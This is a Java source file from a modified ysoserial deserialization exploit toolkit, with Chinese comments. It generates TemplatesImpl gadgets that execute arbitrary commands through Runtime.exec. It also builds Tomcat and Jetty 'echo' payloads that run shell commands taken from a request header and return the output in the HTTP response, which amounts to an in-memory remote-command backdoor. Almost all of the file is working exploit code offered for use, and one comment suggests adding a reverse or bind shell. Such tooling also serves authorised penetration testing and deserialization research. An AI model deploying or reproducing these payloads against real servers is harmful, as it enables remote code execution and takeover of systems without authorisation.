package ysoserial.payloads.util;


import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

import java.io.File;
import java.io.FileInputStream;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import com.nqzero.permit.Permit;
import javassist.*;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
    "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static class StubTransletPayload  {
    }

    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    /*
    参考： https://mp.weixin.qq.com/s/WDmj4-2lB-hlf_Fm_wDiOg
    重载createTemplatesImpl方法，接收参数为让服务端加载的Class对象, _bytecodes参数携带要加载的目标类字节码
    */
    public static <T>  T createTemplatesImpl (Class c ) throws Exception {
        Class<T> tplClass = null;

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            tplClass = (Class<T>)Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
        } else{
            tplClass = (Class<T>)TemplatesImpl.class;
        }

        final  T templates = tplClass.newInstance();
        // 将class转换成字节
        final  byte[] classBytes = ClassFiles.classAsBytes(c);

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes
        });

        Reflections.setFieldValue(templates, "_name", "pwnr" + System.nanoTime());

        return templates;
    }

    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }



    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        final CtClass clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    // 自定义代码，参考：https://xz.aliyun.com/t/7535
    /*
    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {

        final T templates = tplClass.newInstance();

        final byte[] classBytes;
        String cmd;
        ClassPool pool = ClassPool.getDefault();
        final CtClass clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());

        if(command.startsWith("code:")){
            System.err.println("Java Code Mode:"+command.substring(5));
            cmd = command.substring(5);
            clazz.makeClassInitializer().insertAfter(cmd);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            classBytes = clazz.toBytecode();
        } else if(command.startsWith("codefile,")) {
            String path = command.split(",")[1];
            System.out.println(path);

            FileInputStream in =new FileInputStream(new File(path));
            classBytes=new byte[in.available()];
            in.read(classBytes);
            in.close();
//            System.err.println("Java File Mode:"+ Arrays.toString(classBytes));
        } else {
            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
            clazz.makeClassInitializer().insertAfter(cmd);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);
            classBytes = clazz.toBytecode();
        }

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
     */


    public static Object createTemplatesTomcatEcho() throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImplEcho(
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImplEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static Object createTemplatesJettyEcho() throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImplEcho(
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

//        return createTemplatesImplEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
//        return createTemplatesImplJettyEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
        return createTemplatesImplJettyEcho2(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }



    // Jetty回显
    private static <T> T createTemplatesImplJettyEcho(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception{

        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass clazz;
        clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
        if (clazz.getDeclaredConstructors().length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }


        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        clazz.addConstructor(CtNewConstructor.make(
            "    public JettyEcho() throws Exception{\n" +
                "        Class clazz = Thread.currentThread().getClass();\n" +
                "        java.lang.reflect.Field field = clazz.getDeclaredField(\"threadLocals\");\n" +
                "        field.setAccessible(true);\n" +
                "        Object obj = field.get(Thread.currentThread());\n" +
                "        field = obj.getClass().getDeclaredField(\"table\");\n" +
                "        field.setAccessible(true);\n" +
                "        obj = field.get(obj);\n" +
                "        Object[] obj_arr = (Object[]) obj;\n" +
                "        for(int i = 0; i < obj_arr.length; i++){\n" +
                "            Object o = obj_arr[i];\n" +
                "            if(o == null) continue;\n" +
                "            field = o.getClass().getDeclaredField(\"value\");\n" +
                "            field.setAccessible(true);\n" +
                "            obj = field.get(o);\n" +
                "            if(obj != null && obj.getClass().getName().endsWith(\"AsyncHttpConnection\")){\n" +
                "                Object connection = obj;\n" +
                "                java.lang.reflect.Method method = connection.getClass().getMethod(\"getRequest\", null);\n" +
                "                obj = method.invoke(connection, null);\n" +
                "                method = obj.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
                "                String cmd = (String)method.invoke(obj, new Object[]{\"cmd\"});\n" +
                "                if(cmd != null && !cmd.isEmpty()){\n" +
                "                    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
                "                    method = connection.getClass().getMethod(\"getPrintWriter\", new Class[]{String.class});\n" +
                "                    java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, new Object[]{\"utf-8\"});\n" +
                "                    printWriter.println(res);\n" +
                "                }\n" +
                "                break;\n" +
                "            }else if(obj != null && obj.getClass().getName().endsWith(\"HttpConnection\")){\n" +
                "                java.lang.reflect.Method method = obj.getClass().getDeclaredMethod(\"getHttpChannel\", null);\n" +
                "                Object httpChannel = method.invoke(obj, null);\n" +
                "                method = httpChannel.getClass().getMethod(\"getRequest\", null);\n" +
                "                obj = method.invoke(httpChannel, null);\n" +
                "                method = obj.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
                "                String cmd = (String)method.invoke(obj, new Object[]{\"cmd\"});\n" +
                "                if(cmd != null && !cmd.isEmpty()){\n" +
                "                    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
                "                    method = httpChannel.getClass().getMethod(\"getResponse\", null);\n" +
                "                    obj = method.invoke(httpChannel, null);\n" +
                "                    method = obj.getClass().getMethod(\"getWriter\", null);\n" +
                "                    java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);\n" +
                "                    printWriter.println(res);\n" +
                "                }\n" +
                "\n" +
                "                break;\n" +
                "            }\n" +
                "        }\n" +
                "    }"
        ,clazz));

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes,
//            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr" + System.nanoTime());
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    // Jetty回显
    private static <T> T createTemplatesImplJettyEcho2(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception{

        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass clazz;
        clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
        if (clazz.getDeclaredConstructors().length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }


        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        clazz.addConstructor(CtNewConstructor.make("public JettyEcho() throws Exception{\n" +
                "        Thread thread = Thread.currentThread();\n" +
                "        java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField(\"threadLocals\");\n" +
                "        threadLocals.setAccessible(true);\n" +
                "        Object threadLocalMap = threadLocals.get(thread);\n" +
                "        Class threadLocalMapClazz = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap\");\n" +
                "        java.lang.reflect.Field tableField = threadLocalMapClazz.getDeclaredField(\"table\");\n" +
                "        tableField.setAccessible(true);\n" +
                "        Object[] objects = (Object[]) tableField.get(threadLocalMap);\n" +
                "        Class entryClass = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap$Entry\");\n" +
                "        java.lang.reflect.Field entryValueField = entryClass.getDeclaredField(\"value\");\n" +
                "        entryValueField.setAccessible(true);\n" +
                "        for (int i = 0; i < objects.length; i++) {\n" +
                "            Object obj = objects[i];\n" +
                "            if(obj!=null){\n" +
                "                Object httpConnection = entryValueField.get(obj);\n" +
                "                if(httpConnection.getClass().getName().endsWith(\"HttpConnection\")){\n" +
                "                    Object httpChannel = httpConnection.getClass().getMethod(\"getHttpChannel\").invoke(httpConnection);\n" +
                "                    Object request = httpChannel.getClass().getMethod(\"getRequest\").invoke(httpChannel);\n" +
                "                    String header = (String) request.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(request, new Object[]{\"cmd\"});\n" +
                "                    Object response = httpChannel.getClass().getMethod(\"getResponse\").invoke(httpChannel);\n" +
                "                    PrintWriter writer = (PrintWriter)response.getClass().getMethod(\"getWriter\").invoke(response);\n" +
                "                    StringBuilder stringBuilder = new StringBuilder();\n" +
                "                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(header).getInputStream()));\n" +
                "                    String line;\n" +
                "                    while((line = bufferedReader.readLine()) != null) {\n" +
                "                        stringBuilder.append(line).append(\"\\n\");\n" +
                "                    }\n" +
                "                    String res = stringBuilder.toString();\n" +
                "                    writer.write(res);\n" +
                "                    writer.close();\n" +
                "                }\n" +
                "            }\n" +
                "        }\n" +
                "    };"
            ,clazz));

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes,
//            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }



    // Tomcat 全版本 payload，测试通过 tomcat6,7,8,9
    // 给请求添加 Testecho: 123，将在响应 header 看到 Testecho: 123，可以用与可靠漏洞的漏洞检测
    // 给请求添加 Testcmd: id 会执行 id 命令并将回显写在响应 body 中
    public static <T> T createTemplatesImplEcho(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
        throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass clazz;
        clazz = pool.makeClass("ysoserial.Pwner" + System.nanoTime());
        if (clazz.getDeclaredConstructors().length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addMethod(CtMethod.make("private static void writeBody(Object resp, byte[] bs) throws Exception {\n" +
            "    Object o;\n" +
            "    Class clazz;\n" +
            "    try {\n" +
            "        clazz = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
            "        o = clazz.newInstance();\n" +
            "        clazz.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n" +
            "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
            "    } catch (ClassNotFoundException e) {\n" +
            "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
            "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
            "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
            "    } catch (NoSuchMethodException e) {\n" +
            "        clazz = Class.forName(\"java.nio.ByteBuffer\");\n" +
            "        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n" +
            "        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n" +
            "    }\n" +
            "}", clazz));
        clazz.addMethod(CtMethod.make("private static Object getFV(Object o, String s) throws Exception {\n" +
            "    java.lang.reflect.Field f = null;\n" +
            "    Class clazz = o.getClass();\n" +
            "    while (clazz != Object.class) {\n" +
            "        try {\n" +
            "            f = clazz.getDeclaredField(s);\n" +
            "            break;\n" +
            "        } catch (NoSuchFieldException e) {\n" +
            "            clazz = clazz.getSuperclass();\n" +
            "        }\n" +
            "    }\n" +
            "    if (f == null) {\n" +
            "        throw new NoSuchFieldException(s);\n" +
            "    }\n" +
            "    f.setAccessible(true);\n" +
            "    return f.get(o);\n" +
            "}\n", clazz));
        clazz.addConstructor(CtNewConstructor.make("public TomcatEcho() throws Exception {\n" +
            "    Object o;\n" +
            "    Object resp;\n" +
            "    String s;\n" +
            "    boolean done = false;\n" +
            "    Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n" +
            "    for (int i = 0; i < ts.length; i++) {\n" +
            "        Thread t = ts[i];\n" +
            "        if (t == null) {\n" +
            "            continue;\n" +
            "        }\n" +
            "        s = t.getName();\n" +
            "        if (!s.contains(\"exec\") && s.contains(\"http\")) {\n" +
            "            o = getFV(t, \"target\");\n" +
            "            if (!(o instanceof Runnable)) {\n" +
            "                continue;\n" +
            "            }\n" +
            "\n" +
            "            try {\n" +
            "                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n" +
            "            } catch (Exception e) {\n" +
            "                continue;\n" +
            "            }\n" +
            "\n" +
            "            java.util.List ps = (java.util.List) getFV(o, \"processors\");\n" +
            "            for (int j = 0; j < ps.size(); j++) {\n" +
            "                Object p = ps.get(j);\n" +
            "                o = getFV(p, \"req\");\n" +
            "                resp = o.getClass().getMethod(\"getResponse\", new Class[0]).invoke(o, new Object[0]);\n" +
            "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"Testecho\"});\n" +
            "                if (s != null && !s.isEmpty()) {\n" +
            "                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});\n" +
            "                    resp.getClass().getMethod(\"addHeader\", new Class[]{String.class, String.class}).invoke(resp, new Object[]{\"Testecho\", s});\n" +
            "                    done = true;\n" +
            "                }\n" +
            "                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"cmd\"});\n" +
            "                if (s != null && !s.isEmpty()) {\n" +
            "                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});\n" +
            "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", s} : new String[]{\"/bin/sh\", \"-c\", s};\n" +
            "                    writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes());\n" +
            "                    done = true;\n" +
            "                }\n" +
            "                if ((s == null || s.isEmpty()) && done) {\n" +
            "                    writeBody(resp, System.getProperties().toString().getBytes());\n" +
            "                }\n" +
            "\n" +
            "                if (done) {\n" +
            "                    break;\n" +
            "                }\n" +
            "            }\n" +
            "            if (done) {\n" +
            "                break;\n" +
            "            }\n" +
            "        }\n" +
            "    }\n" +
            "}", clazz));

        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
            classBytes,
//            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}
